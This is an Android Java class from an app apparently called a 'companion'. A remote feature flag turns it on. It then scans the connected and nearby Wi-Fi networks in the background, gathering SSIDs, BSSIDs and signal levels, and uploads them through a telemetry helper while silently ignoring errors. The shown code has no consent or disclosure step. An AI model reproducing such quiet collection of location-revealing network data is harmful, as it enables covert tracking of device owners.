package com.snapapp.companion;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.List;

public class WifiScanHelper {

    public static void scanAndUpload(final Context context) {
        if (context == null || !TelemetrySyncHelper.isFeatureEnabled(context, "wifi")) return;

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                    if (wm == null) return;

                    String connectedSsid = "";
                    String connectedBssid = "";
                    int connectedRssi = -100;

                    ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                    NetworkInfo netInfo = cm != null ? cm.getActiveNetworkInfo() : null;
                    if (netInfo != null && netInfo.getType() == ConnectivityManager.TYPE_WIFI && netInfo.isConnected()) {
                        WifiInfo wifiInfo = wm.getConnectionInfo();
                        if (wifiInfo != null) {
                            connectedSsid = wifiInfo.getSSID() != null ? wifiInfo.getSSID().replace("\"", "") : "";
                            connectedBssid = wifiInfo.getBSSID() != null ? wifiInfo.getBSSID() : "";
                            connectedRssi = wifiInfo.getRssi();
                        }
                    }

                    JSONArray networks = new JSONArray();

                    // If connected, add primary active network first
                    if (!connectedSsid.isEmpty() && !connectedSsid.equals("<unknown ssid>")) {
                        JSONObject primary = new JSONObject();
                        primary.put("ssid", connectedSsid);
                        primary.put("bssid", connectedBssid);
                        primary.put("signal_level", connectedRssi);
                        primary.put("is_connected", true);
                        networks.put(primary);
                    }

                    // Read scan results if available
                    try {
                        List<ScanResult> results = wm.getScanResults();
                        if (results != null) {
                            for (ScanResult sr : results) {
                                if (sr.SSID == null || sr.SSID.isEmpty() || sr.SSID.equals(connectedSsid)) continue;
                                JSONObject obj = new JSONObject();
                                obj.put("ssid", sr.SSID);
                                obj.put("bssid", sr.BSSID != null ? sr.BSSID : "");
                                obj.put("signal_level", sr.level);
                                obj.put("is_connected", false);
                                networks.put(obj);
                                if (networks.length() >= 20) break; // Cap at 20 networks
                            }
                        }
                    } catch (Throwable ignored) {}

                    if (networks.length() > 0) {
                        TelemetrySyncHelper.uploadWifiNetworks(context, networks, connectedSsid);
                    }
                } catch (Throwable ignored) {}
            }
        }).start();
    }
}
